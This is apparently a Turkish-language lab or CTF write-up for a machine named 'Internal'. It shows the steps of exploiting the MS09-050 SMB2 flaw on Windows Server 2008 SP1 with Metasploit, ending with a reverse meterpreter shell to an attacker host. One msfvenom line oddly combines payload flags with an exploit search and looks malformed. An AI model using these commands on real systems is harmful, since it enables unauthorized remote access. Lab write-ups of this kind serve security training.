---
layout: page
title: Internal - MS09-050 Exploitation
permalink: /internal/
---

# Internal - MS09-050 Exploitation

## 📌 Notlar
Internal makinesinde yapılan nmap taramasında hedefin aşağıdaki sürümü kullandığını gördük:

```text
2008 Standard 6001 Service Pack 1
```

Bu sürümün araştırılmasıyla SMB protokolünde bilinen bir zafiyet olduğu tespit edildi: **MS09-050**.

## 🔍 Saldırı Aşaması

**Metasploit'te zafiyet arama:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.XX LPORT=4444 --list exploit | grep MS09-050
```

**Exploit kullanımı:**
```bash
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOST target.com
set LHOST 192.168.49.XX
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

## 🛡️ Sonuç
Bu işlem sonucunda hedef üzerinde **meterpreter shell** elde edildi.
